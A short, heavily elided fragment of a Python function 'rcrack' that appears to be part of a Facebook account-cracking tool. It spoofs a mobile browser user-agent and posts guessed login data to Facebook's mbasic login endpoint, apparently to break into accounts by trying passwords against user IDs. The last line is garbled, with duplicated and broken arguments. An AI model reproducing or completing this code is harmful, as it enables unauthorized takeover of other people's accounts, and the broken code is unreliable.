...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
			...
			lo = session.post( 'https://mbasic.facebook.com/login/save-device/?login_source=login&wtsid=rdr_1GArbEa097Y8Q2vVF&refsrc=deprecated&_rdr',data=log_data,headers=header_mbasicfb',data=log_data,headers=header_freefb).text
